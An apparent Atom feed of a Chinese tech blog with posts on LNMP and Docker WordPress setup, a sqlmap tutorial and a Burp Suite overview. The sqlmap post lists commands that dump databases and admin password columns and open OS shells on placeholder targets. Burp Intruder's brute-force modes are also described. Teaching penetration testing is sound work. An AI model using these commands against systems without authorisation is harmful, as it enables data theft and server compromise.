<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>DiZai</title>
  
  <subtitle>Just do IT</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-08-15T15:29:07.036Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>迪仔</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CentOS 下 LNMP 环境配置（yum安装）</title>
    <link href="http://yoursite.com/2018/08/15/CentOS-%E4%B8%8B-LNMP-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%EF%BC%88yum%E5%AE%89%E8%A3%85%EF%BC%89/"/>
    <id>http://yoursite.com/2018/08/15/CentOS-下-LNMP-环境配置（yum安装）/</id>
    <published>2018-08-15T15:11:42.000Z</published>
    <updated>2018-08-15T15:29:07.036Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>LNMP 环境代表 Linux 系统下 Nginx + MySQL + PHP 网站服务器架构。</p><p>Linux是一类Unix计算机操作系统的统称，是目前最流行的免费操作系统。代表版本有：debian、centos、ubuntu、fedora、gentoo等。</p><a id="more"></a><p>Nginx是一个高性能的HTTP和反向代理服务器，也是一个IMAP/POP3/SMTP代理服务器。</p><p>Mysql是一个小型关系型数据库管理系统。</p><p>PHP是一种在服务器端执行的嵌入HTML文档的脚本语言。</p><p>这四种软件均为免费开源软件，组合到一起，成为一个免费、高效、扩展性强的网站服务系统。</p><h3 id="安装配置-Nginx"><a href="#安装配置-Nginx" class="headerlink" title="安装配置 Nginx"></a>安装配置 Nginx</h3><p><strong>自动安装 Nginx。输入命令：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">yum install nginx systemctl start nginx</span><br></pre></td></tr></table></figure></p><p><strong>浏览器中测试 Nginx 服务是否正常运行。访问 CentOS 云服务器公网 IP。</strong></p><p><img src="/images/LNMP/1.png" alt="upload successful"></p><h3 id="安装配置-MySQL"><a href="#安装配置-MySQL" class="headerlink" title="安装配置 MySQL"></a>安装配置 MySQL</h3><p><strong>注意：</strong></p><p><strong>从 CentOS 7 系统开始，MariaDB 成为 yum 源中默认的数据库安装包。在 CentOS 7 及以上的系统中使用 yum 安装 MySQL 包将无法使用 MySQL。您可以选择使用完全兼容的 MariaDB，或自行安装较低版本的 MySQL。</strong></p><p><strong>安装 MySQL。输入以下命令：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install mariadb mariadb-server</span><br></pre></td></tr></table></figure></p><p><strong>启动 MySQL 服务。</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start mariadb.service</span><br></pre></td></tr></table></figure></p><p><strong>登录 MySQL ，删除空用户</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select user,host,password from mysql.user;</span><br><span class="line">MariaDB [(none)]&gt; select user,host,password from mysql.user;</span><br></pre></td></tr></table></figure></p><p><img src="/images/LNMP/2.png" alt="upload successful"></p><p><strong>修改 root 密码。</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; update mysql.user set password = (&apos;toor&apos;) where user=&apos;root&apos;</span><br><span class="line">MariaDB [(none)]&gt; flush privileges;</span><br></pre></td></tr></table></figure></p><p><img src="/images/LNMP/3.png" alt="upload successful"></p><h3 id="安装配置-PHP"><a href="#安装配置-PHP" class="headerlink" title="安装配置 PHP"></a>安装配置 PHP</h3><p><strong>安装 PHP 。输入命令进行安装：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install php lighttpd-fastcgi php-cli php-mysql php-gd php-imap php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-mcrypt php-mssql php-snmp php-soap</span><br></pre></td></tr></table></figure></p><p><strong>安装所需组件使 PHP 支持 MySQL、FastCGI 模式。</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install  php-tidy php-common php-devel php-fpm php-mysql</span><br></pre></td></tr></table></figure></p><h4 id="Nginx-与-PHP-FPM-集成"><a href="#Nginx-与-PHP-FPM-集成" class="headerlink" title="Nginx 与 PHP-FPM 集成"></a>Nginx 与 PHP-FPM 集成</h4><p><strong>启动 PHP-FPM。输入命令启动 PHP-FPM 服务</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service php-fpm start 。</span><br></pre></td></tr></table></figure></p><p><strong>输入命令查看 PHP-FPM 默认配置</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/php-fpm.d/www.conf |grep -i &apos;listen =&apos;</span><br></pre></td></tr></table></figure></p><p>返回结果为：listen = 127.0.0.1:9000，表明 PHP-FPM 默认配置的监听端口为 9000，只需修改配置，将 PHP 解析的请求转发到 127.0.0.0:9000 处理即可。</p><p><img src="/images/LNMP/4.png" alt="upload successful"></p><p><strong>修改 Nginx 配置。</strong></p><p><strong>输入命令查找 Nginx 配置文件</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -t</span><br></pre></td></tr></table></figure></p><p><strong>使用vi命令修改该配置文件：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure></p><p><strong>修改红框里面的内容。</strong></p><p><img src="/images/LNMP/5.png" alt="upload successful"></p><p> <strong>配置完成后，重启服务。</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure></p><p><strong>环境配置验证</strong></p><p><strong>用以下命令在 web 目录下创建 index.php：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/share/nginx/html/index.php</span><br><span class="line"></span><br><span class="line">&lt;?php echo &quot;&lt;title&gt;Test Page&lt;/title&gt;&quot;; echo &quot;hello world&quot;; ?&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/images/LNMP/6.png" alt="upload successful"></p><p><strong>验证：在浏览器中输入服务器ip:index.php，出现hello world页面，说明配置成功。</strong></p><p><img src="/images/LNMP/7.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;LNMP 环境代表 Linux 系统下 Nginx + MySQL + PHP 网站服务器架构。&lt;/p&gt;
&lt;p&gt;Linux是一类Unix计算机操作系统的统称，是目前最流行的免费操作系统。代表版本有：debian、centos、ubuntu、fedora、gentoo等。&lt;/p&gt;
    
    </summary>
    
      <category term="搭建服务" scheme="http://yoursite.com/categories/%E6%90%AD%E5%BB%BA%E6%9C%8D%E5%8A%A1/"/>
    
    
      <category term="LNMP" scheme="http://yoursite.com/tags/LNMP/"/>
    
      <category term="ngixn" scheme="http://yoursite.com/tags/ngixn/"/>
    
      <category term="mysql" scheme="http://yoursite.com/tags/mysql/"/>
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>用Docker一分钟搭建WordPress博客</title>
    <link href="http://yoursite.com/2018/08/15/%E7%94%A8Docker%E4%B8%80%E5%88%86%E9%92%9F%E6%90%AD%E5%BB%BAWordPress%E5%8D%9A%E5%AE%A2/"/>
    <id>http://yoursite.com/2018/08/15/用Docker一分钟搭建WordPress博客/</id>
    <published>2018-08-15T12:42:58.000Z</published>
    <updated>2018-08-15T12:57:28.252Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-【前言】"><a href="#0x01-【前言】" class="headerlink" title="0x01 【前言】"></a>0x01 【前言】</h3><p>WordPress是一个非常著名的PHP编写的博客平台，发展到目前为止已经形成了一个庞大的网站平台系统。在WP上有规模庞大的插件和主题，可以帮助我们快速建立一个博客甚至网站。</p><a id="more"></a><p>在Windows上可以非常方便的安装WordPress，因为IIS上集成了WordPress的一键安装包。而在Linux上安装WordPress就比较复杂了，我们需要配置PHP环境、Apache或者Nginx服务器、MySQL数据库以及各种权限和访问问题。所以在Linux上最好的办法就是使用Docker来安装WordPress。</p><p><img src="/images/博客搭建/1.png" alt="upload successful"></p><h3 id="0x02-【安装环境】"><a href="#0x02-【安装环境】" class="headerlink" title="0x02 【安装环境】"></a>0x02 【安装环境】</h3><p>CentOS Linux release 7.5.1804(Core)</p><h3 id="0x03-【安装步骤】"><a href="#0x03-【安装步骤】" class="headerlink" title="0x03 【安装步骤】"></a>0x03 【安装步骤】</h3><h4 id="一、安装Docker"><a href="#一、安装Docker" class="headerlink" title="一、安装Docker"></a>一、安装Docker</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum update -y</span><br><span class="line"></span><br><span class="line">yum -y install docker</span><br><span class="line"></span><br><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><p><strong>验证安装</strong></p><p>docker version</p><p><img src="/images/博客搭建/2.png" alt="upload successful"></p><p><strong>配置Docker</strong></p><p><strong>设置镜像</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> &quot;registry-mirrors&quot;: [&quot;https://aj2rgad5.mirror.aliyuncs.com&quot;]</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>重启Docker</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line"></span><br><span class="line">systemctl restart docker.service</span><br></pre></td></tr></table></figure></p><h4 id="二、安装WordPress"><a href="#二、安装WordPress" class="headerlink" title="二、安装WordPress"></a>二、安装WordPress</h4><p>有了Docker，安装WordPress就很简单了，直接一条命令搞定。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull wordpress:latest</span><br></pre></td></tr></table></figure></p><h4 id="三、安装MySQL"><a href="#三、安装MySQL" class="headerlink" title="三、安装MySQL"></a>三、安装MySQL</h4><p>WordPress需要使用MySQL数据库，这里也有两种方式，第一种是安装本地MySQL，第二种就是在Docker中安装MySQL镜像。如果要在Docker中安装MySQL也非常简单，同样一条命令搞定。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull mysql:latest</span><br></pre></td></tr></table></figure></p><p>启动MySQL使用下面的命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag</span><br></pre></td></tr></table></figure></p><p>name参数指定要启动的实例名称，MYSQL_ROOT_PASSWORD指定ROOT密码。tag参数是MySQL的版本号，可以是5.7、5.6、8.0</p><h4 id="四、配置WordPress"><a href="#四、配置WordPress" class="headerlink" title="四、配置WordPress"></a>四、配置WordPress</h4><p>安装好数据库之后，就可以启动WordPress了。详细的文档参考<a href="https://hub.docker.com/r/library/wordpress/" target="_blank" rel="noopener">这里</a>。如果使用Docker中安装的MySQL实例，使用下面的命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name some-wordpress --link some-mysql:mysql -p 8080:80 -d wordpress</span><br></pre></td></tr></table></figure></p><p>name参数指定要启动的WordPress实例名称，link参数指定要使用的Docker MySQL实例名称，p参数将Docker内部的80端口映射到本地的8080端口上。</p><h4 id="五、检测"><a href="#五、检测" class="headerlink" title="五、检测"></a>五、检测</h4><p>然后打开浏览器，输入localhost:8080（端口号是命令中设置的），然后就可以看到WordPress了。按照提示输入用户名等信息，然后安装WordPress。等到它提示安装完成，那么WordPress的安装就算大功告成了。</p><p>最后稍加配置，再添加诸如内网映射等功能之后，站点就可以对外访问了。</p><p><img src="/images/博客搭建/3.png" alt="upload successful"></p><h3 id="0x04-参考文献："><a href="#0x04-参考文献：" class="headerlink" title="0x04 参考文献："></a>0x04 参考文献：</h3><p><a href="https://blog.csdn.net/u011054333/article/details/70136099" target="_blank" rel="noopener">https://blog.csdn.net/u011054333/article/details/70136099</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-【前言】&quot;&gt;&lt;a href=&quot;#0x01-【前言】&quot; class=&quot;headerlink&quot; title=&quot;0x01 【前言】&quot;&gt;&lt;/a&gt;0x01 【前言】&lt;/h3&gt;&lt;p&gt;WordPress是一个非常著名的PHP编写的博客平台，发展到目前为止已经形成了一个庞大的网站平台系统。在WP上有规模庞大的插件和主题，可以帮助我们快速建立一个博客甚至网站。&lt;/p&gt;
    
    </summary>
    
      <category term="搭建博客" scheme="http://yoursite.com/categories/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
    
    
      <category term="博客，mysql，wordpress" scheme="http://yoursite.com/tags/%E5%8D%9A%E5%AE%A2%EF%BC%8Cmysql%EF%BC%8Cwordpress/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap基本使用</title>
    <link href="http://yoursite.com/2018/08/15/sqlmap%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2018/08/15/sqlmap基本使用/</id>
    <published>2018-08-15T02:41:33.000Z</published>
    <updated>2018-08-15T02:50:08.302Z</updated>
    
    <content type="html"><![CDATA[<p>完全支持MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、HSQLDB和Informix等多种数据库管理系统</p><p>完全支持布尔型盲注、时间型盲注、基于错误信息的注入、联合查询注入和堆查询注入。</p><a id="more"></a><p>在数据库证书、IP地址、端口和数据库名等条件允许的情况下支持不通过SQL注入点而直接连接数据库。</p><p>支持枚举用户、密码、哈希、权限、角色、数据库、数据表和列。</p><h3 id="Liunx上安装sqlmap"><a href="#Liunx上安装sqlmap" class="headerlink" title="Liunx上安装sqlmap"></a>Liunx上安装sqlmap</h3><p><img src="/images/安全工具/8.png" alt="upload successful"></p><h3 id="Windwos上安装sqlmap"><a href="#Windwos上安装sqlmap" class="headerlink" title="Windwos上安装sqlmap"></a>Windwos上安装sqlmap</h3><p>安装python环境，并设置环境变量</p><p>将SQLMAP安装包解压到文件夹sqlmap中，并拷贝到 “C:\Python27” 目录下</p><p><strong>SQLmap检测sql注入</strong></p><p>使用python sqlmap.py  -u  ‘<a href="http://xxx/xx?id=1&#39;" target="_blank" rel="noopener">http://xxx/xx?id=1&#39;</a></p><p>sqlmap -u “注入点地址”   –cookie=     -D  数据库     -T  usr –column  </p><p><strong>SQLmap通过注入获取当前数据库</strong></p><p>使用python sqlmap.py  -u  ‘<a href="http://xxx/xx?id=1&#39;" target="_blank" rel="noopener">http://xxx/xx?id=1&#39;</a>  –current-db</p><p><strong>SQLmap通过注入获取数据库下的表</strong></p><p>使用python sqlmap.py -ua  ‘<a href="http://xxx/xx?id=1&#39;" target="_blank" rel="noopener">http://xxx/xx?id=1&#39;</a>  –tables   -D   database</p><p><strong>SQLmap通过注入获取表内数据</strong></p><p>使用python sqlmap.py  -u  ‘<a href="http://xxx/xx?id=1&#39;" target="_blank" rel="noopener">http://xxx/xx?id=1&#39;</a>  –dump    -T tables    -D   database</p><p><strong>SQLmap通过注入执行sql语句</strong></p><p>使用 python sqlmap.py  -u  ‘<a href="http://xxx/xx?id=1&#39;" target="_blank" rel="noopener">http://xxx/xx?id=1&#39;</a>  –sql-shell</p><p><strong>SQLmap通过注入执行系统命令</strong></p><p>使用 python sqlmap.py  -u  ‘<a href="http://xxx/xx?id=1&#39;" target="_blank" rel="noopener">http://xxx/xx?id=1&#39;</a>  –os-shell</p><p><strong>若数据库管理系统是MySQL、PostgreSQL或微软的SQL Server且当前用户有相关权限Sqlmap就能利用SQL注入执行任意的操作系统命令。</strong></p><p>当数据库管理系统是MySQL或PostgreSQL时，Sqlmap会通过前面介绍过的文件上传功能上传一个包含用户自定义函数sys_exec()和sys_eval()的二进制共享库文件，然后创建这两个用户自定义函数，通过这两个函数之一来执行用户指定的命令。选择哪个函数取决于用户是否想要显示命令执行的标准输出。</p><h3 id="获取目标方式"><a href="#获取目标方式" class="headerlink" title="获取目标方式"></a>获取目标方式</h3><p><strong>1.直接连接到数据库</strong></p><p>​    参数：-d</p><p>​    对单个数据库实例运行sqlmap</p><p>python sqlmap.py -d “mysql://admin:<a href="mailto:admin@192.168.1.2" target="_blank" rel="noopener">admin@192.168.1.2</a>:3306/testdb” -f –banner –dbs –users</p><p><strong>2.目标URL</strong></p><p>​    参数：-u或者—url</p><p>​    URL格式要求：http(s)://targeturl[:port]/[…]</p><p>python sqlmap.py -u “<a href="http://www.target.com/vuln.php?id=1&quot;" target="_blank" rel="noopener">http://www.target.com/vuln.php?id=1&quot;</a> -f –banner –dbs –users</p><p><strong>3.从Burp或WebScarab代理中获取日志</strong></p><p>​    参数：-l</p><p>​    把Burp proxy或者WebScarab proxy中的日志直接导出来交给sqlmap检测</p><p><strong>4.从文本中获取多个目标扫描</strong></p><p>​    参数：-m</p><p>​    URL保存在文本中，sqlmap会一个一个检测</p><p><strong>5.从文件中加载HTTP请求</strong></p><p>​    参数：-r</p><p>​    【可以跳过设置一些其他参数比如cookie，POST数据】</p><p>​    当请求是HTTPS的时候要配合—force-ssl参数来使用，或者你可以在Host头后面加上:443</p><h3 id="请求方式："><a href="#请求方式：" class="headerlink" title="请求方式："></a>请求方式：</h3><p><strong>1.http数据</strong></p><p>​    参数：–data</p><p>​    此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数</p><p>​    python sqlmap.py -u “<a href="http://www.target.com/vuln.php&quot;" target="_blank" rel="noopener">http://www.target.com/vuln.php&quot;</a> –data=”id=1” -f –banner –dbs –users</p><p><strong>2.参数拆分字符</strong></p><p>​    参数：–param-del</p><p>​    当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数</p><p>​    python sqlmap.py -u “<a href="http://www.target.com/vuln.php&quot;" target="_blank" rel="noopener">http://www.target.com/vuln.php&quot;</a> –data=”query=foobar;id=1” –param-del=”;” -f –banner –dbs –users</p><p><strong>3.HTTP cookie头</strong></p><p>​    参数：–cookie/–load-cookies/–drop-set-cookie</p><p>​    a.web应用需要登陆的时候</p><p>​    b.你想要在这些头参数中测试SQL注入时</p><p>​    如果你不想接受set-cookie可以使用—drop-set-cookie参数来拒接</p><p><strong>4.HTTP User-Agent头</strong></p><p>​    参数：–user-agent/–random-agent</p><p>​    【可以使用–user-agent参数来修改，同时也可以使用–random-agent参数来随机的从./txt/user-agents.txt中获取】</p><p>​    当–level参数设定为3或者3以上的时候，会尝试对User-agent进行注入</p><h3 id="探测："><a href="#探测：" class="headerlink" title="探测："></a>探测：</h3><p><strong>1.URI注入点</strong></p><p>​    参数：-u</p><p>​    python sqlmap.py -u “<a href="http://www.target.com/vuln/param1/vuln1*/param2&quot;" target="_blank" rel="noopener">http://www.target.com/vuln/param1/vuln1*/param2&quot;</a></p><p><strong>2.指定数据库</strong></p><p>​    参数：–dbms</p><p>​    sqlmap会自动探测web的应用后端数据库是什么</p><p><strong>3.风险等级</strong></p><p>​    参数：–risk</p><p>​    共有四个风险等级，默认是1，会探测大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</p><p><strong>4.列出数据库系统的数据库</strong>    </p><p>参数：–dbs    当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库</p><p><strong>5.列举数据库表</strong>    </p><p>参数：–tables,–exclude-sysdbs,-D    当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。</p><p>​    –exclude-sysdbs参数是指排除包含了所有数据库名的系统数据库。</p><p>​    需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。</p><p><strong>6.列举数据库表中的字段</strong>    </p><p>参数：–columns,-C,-T,-D    当前用户有权限读取包含所有数据库表信息的表中数据的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。</p><p>​    如果没有使用-D参数指定数据库时，默认会使用当前数据库。</p><p><strong>7.获取整个表的数据</strong>    </p><p>参数：–dump,-C,-T,-D,–start,–stop,–first,–last    如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取整个表的所有内容。</p><p>​    使用-D,-T参数指定想要获取哪个库的哪个表，不使用-D参数时，默认使用当前库。    可以获取指定库中的所有表的内容，使用–dump跟-D参数（不使用-T与-C参数）。</p><h3 id="爆破："><a href="#爆破：" class="headerlink" title="爆破："></a>爆破：</h3><p><strong>1.暴力破解表名</strong>    </p><p>参数：–common-tables    当使用–tables无法获取到数据库的表时，可以使用此参数。通常是如下情况：</p><p><strong>1、MySQL数据库版本小于5.0，没有information_schema表。</strong></p><p><strong>2、数据库是MicrossoftAccess，系统表MSysObjects是不可读的（默认）。</strong></p><p><strong>3、当前用户没有权限读取系统中保存数据结构的表的权限。</strong></p><p>​    <strong>暴力破解的表在txt/common-tables.txt文件中，你可以自己添加。</strong></p><p><strong>2.暴力破解列名</strong>    </p><p>参数：–common-columns    与暴力破解表名一样，暴力跑的列名在txt/common-columns.txt中。</p><h3 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h3><p>列取数据库 sqlmap.py -u [URL] –dbs</p><p>获取当前数据库 sqlmap.py -u [URL] –current-db</p><p>判断当前数据库用户角色 sqlmap.py -u [URL] –privileges </p><p>判断当前数据库用户是否为数据库管理员 sqlmap.py -u [URL] –-is-dba </p><p>列表名 sqlmap.py -u [URL] –dbms “mysql” –tables -D “db_name”</p><p>列字段 sqlmap.py -u [URL] –dbms “mysql” –columns -D “db_name” -T “ex_admin“ </p><p>获取字段内容 sqlmap.py -u  [URL]  –dbms “mysql”  –dump -D  “db_name”  -T  “ex_admin”  -C “ex_password,ex_username</p><p>如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数 据的，可以使用-v参数。</p><p>共有七个等级，默认为1：</p><p>0、只显示python错误以及严重的信息。 </p><p>1、同时显示基本信息和警告信息。（默认） </p><p>2、同时显示debug信息。 </p><p>3、同时显示注入的payload。 </p><p>4、同时显示HTTP请求。 </p><p>5、同时显示HTTP响应头。 </p><p>6、同时显示HTTP响应页面。</p><p><strong>如果你想看到sqlmap发送的测试payload最好的等级就是3</strong></p><h3 id="sqlmap常用命令"><a href="#sqlmap常用命令" class="headerlink" title="sqlmap常用命令"></a>sqlmap常用命令</h3><p>-u 指定url（需带get） </p><p>-m 从文件读取 </p><p>-r 从request文件测试 </p><p>-l 从burp的log </p><p>–data 有时无法识别时 用-r </p><p>–file-read –file-write –os-cmd/–os-shell –flush-session </p><p>➢api 自动化、分布式 </p><p>sqlmapapi.py -s H 127.0.0.1 -p 6666</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;完全支持MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、HSQLDB和Informix等多种数据库管理系统&lt;/p&gt;
&lt;p&gt;完全支持布尔型盲注、时间型盲注、基于错误信息的注入、联合查询注入和堆查询注入。&lt;/p&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="工具使用，slqmap" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%EF%BC%8Cslqmap/"/>
    
  </entry>
  
  <entry>
    <title>Burp Suite基本认识</title>
    <link href="http://yoursite.com/2018/08/15/Burp-Suite%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%86/"/>
    <id>http://yoursite.com/2018/08/15/Burp-Suite基本认识/</id>
    <published>2018-08-15T02:23:24.000Z</published>
    <updated>2018-08-15T02:38:49.226Z</updated>
    
    <content type="html"><![CDATA[<p>Burp Suite 是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。它主要用来做安全性渗透测试,代理工具可以说是Burp Suite测试流程的一个心脏，它可以让你通过浏览器来浏览应用程序来捕获所有相关信息，并让您轻松地开始进一步行动。</p><a id="more"></a><p><img src="/images/安全工具/7.png" alt="upload successful"><br><img src="/images/安全工具/1.png" alt="upload successful"></p><h3 id="Target功能"><a href="#Target功能" class="headerlink" title="Target功能"></a>Target功能</h3><p>目标工具包含了SiteMap，用你的目标应用程序的详细信息。它可以 让你定义哪些对象在范围上为你目前的工作，也可以让你手动测试漏 洞的过程。</p><p>site map——add to scope——点击Filter勾选Show only inscope item</p><h3 id="proxy（抓包）"><a href="#proxy（抓包）" class="headerlink" title="proxy（抓包）"></a>proxy（抓包）</h3><p>当我们设置好代理后，浏览器和服务器之间的数据包会被burp拦截，我们可以修改浏览器限制数据，修改完成直接forward就可以。</p><p><img src="/images/安全工具/2.png" alt="upload successful"></p><h3 id="spider（爬虫）"><a href="#spider（爬虫）" class="headerlink" title="spider（爬虫）"></a>spider（爬虫）</h3><p>可以利用爬虫从页面源代码中提取子域名，以 burp 的爬虫为例：</p><p><img src="/images/安全工具/3.png" alt="upload successful"></p><h3 id="scanner（扫描）"><a href="#scanner（扫描）" class="headerlink" title="scanner（扫描）"></a>scanner（扫描）</h3><p>Burp Scanner的功能主要是用来自动检测web系统的各种漏洞，我们可以使用Burp Scanner代替我们手工去对系统进行普通漏洞类型的渗透测试，从而能使得我们把更多的精力放在那些必须要人工去验证的漏洞上。<br><img src="/images/安全工具/4.png" alt="upload successful"></p><p><img src="/images/安全工具/5.png" alt="upload successful"></p><h3 id="Intruder（爆破）"><a href="#Intruder（爆破）" class="headerlink" title="Intruder（爆破）"></a>Intruder（爆破）</h3><p>Burp intruder是一个强大的工具，用于自动对Web应用程序自定 义的攻击。它可以用来自动执行所有类型的任务您的测试过程中可 能出现的u支持自动识别密码哈希格式并通过字典破解密码哈希。</p><p>支持完全地下载某个数据库中的某个表，也可以只下载某个表中的某几列，甚至只下载某一列中的部分数据，这完全取决于用户的选择。</p><p>支持在数据库管理系统中搜索指定的数据库名、表名或列名</p><p>当数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时支持下载或上传文件。</p><p>​    当数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时支持执行任意命令并回现标准输出</p><p><img src="/images/安全工具/6.png" alt="upload successful"></p><p><strong>第一种：</strong></p><p>Sniper标签 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。</p><p><strong>第二种：</strong></p><p>Battering ram – 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中</p><p><strong>第三种：</strong></p><p>Pitchfork – 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量</p><p><strong>第四种：</strong></p><p>Cluster bomb – 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。</p><h3 id="Repeater功能"><a href="#Repeater功能" class="headerlink" title="Repeater功能"></a>Repeater功能</h3><p>Burp Repeater(中继器)是用于手动操作和补发个别HTTP请求，并 分析应用程序的响应一个简单的工具。您可以发送一个内部请求从 Burp任何地方到Repeater(中继器)，修改请求并且发送它。</p><p>➢您可以使用中继器用于各种目的，如改变参数值来测试输入为基础 的漏洞，发出以特定的顺序要求，以测试逻辑缺陷，并可以多次重 发从Burp Scanning results(扫描结果)的要求手动验证报告的问题。</p>]]></content>
    
